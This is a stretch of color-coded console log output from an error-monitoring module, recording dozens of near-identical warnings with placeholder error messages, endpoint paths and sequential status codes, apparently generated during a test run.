WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810340Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2298'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810391Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2299'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810441Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2300'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810491Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2301'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810541Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2302'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810591Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2303'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810640Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2304'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810689Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2305'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810737Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2306'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2307'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810833Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2308'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810881Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2309'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810930Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2310'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810977Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2311'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811025Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2312'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811072Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2313'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811121Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2314'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811174Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2315'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811269Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2316'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811339Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2317'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811395Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2318'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811446Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2319'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811501Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2320'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811553Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2321'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811604Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2322'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811653Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2323'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811702Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2324'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2325'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2326'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811925Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2327'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.811979Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2328'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812030Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2329'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812080Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2330'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812129Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2331'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812180Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2332'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2333'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812280Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2334'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812329Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2335'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812377Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2336'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812425Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2337'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
